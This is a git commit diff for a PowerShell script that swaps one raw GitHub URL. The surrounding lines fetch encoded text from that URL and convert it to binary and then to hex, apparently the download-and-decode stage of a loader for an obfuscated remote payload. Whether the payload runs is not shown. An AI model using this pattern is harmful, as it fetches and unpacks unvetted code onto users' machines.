963cf99578a19d562851eb47c25160d2efc55dc7
notforuseactually <114967430+notforuseactually@users.noreply.github.com>
2024-02-04 21:18:22 -0700

    Update and rename 68.ps1 to 66.ps1

--- 66.ps1
+++ 66.ps1
@@ -154,7 +154,7 @@ Function Cleanup {
 
 # Script Execution Example (Uncomment as needed for debugging)
 
-$url = "https://raw.githubusercontent.com/notforuseactually/404/main/9.txt"
+$url = "https://raw.githubusercontent.com/notforuseactually/404/main/2.txt"
 $rawText = FetchTextFromURL -url $url
 $binaryString = Convert-EncodedStringToBinary -encodedString $rawText
 $hexString = Convert-BinaryToHex -binaryString $binaryString
